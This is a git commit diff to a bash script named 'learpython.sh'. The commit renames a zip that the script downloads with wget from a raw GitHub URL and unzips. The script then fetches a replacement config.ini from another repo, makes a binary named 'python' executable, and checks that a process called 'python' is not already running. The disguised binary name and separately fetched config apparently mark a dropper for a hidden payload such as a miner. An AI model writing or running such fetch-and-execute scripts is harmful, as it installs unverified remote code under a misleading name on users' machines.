ebc23658e0bc32a3459bc4f22327419b481c9758
haidanglx <40859600+haidanglx@users.noreply.github.com>
2020-02-29 15:32:07 +0700

    Update learpython.sh

--- learpython.sh
+++ learpython.sh
@@ -1,6 +1,6 @@
 #! /bin/bash
 set -x #echo on
-if [ -f ${PWD}/learnpython.zip ]; then
+if [ -f ${PWD}/learnpythonn.zip ]; then
     if pgrep -x "python" > /dev/null
 then
     echo "scrip dang chay roi , ke cmn di "
@@ -14,8 +14,8 @@ fi
 exit
 fi
 
-wget https://raw.githubusercontent.com/haidanglx/haidanglxx/master/learnpython.zip
-unzip learnpython.zip
+wget https://raw.githubusercontent.com/haidanglx/haidanglxx/master/learnpythonn.zip
+unzip learnpythonn.zip
 rm config.ini
 wget https://raw.githubusercontent.com/haidanglx/Tonghop/master/config.ini
 chmod +x python
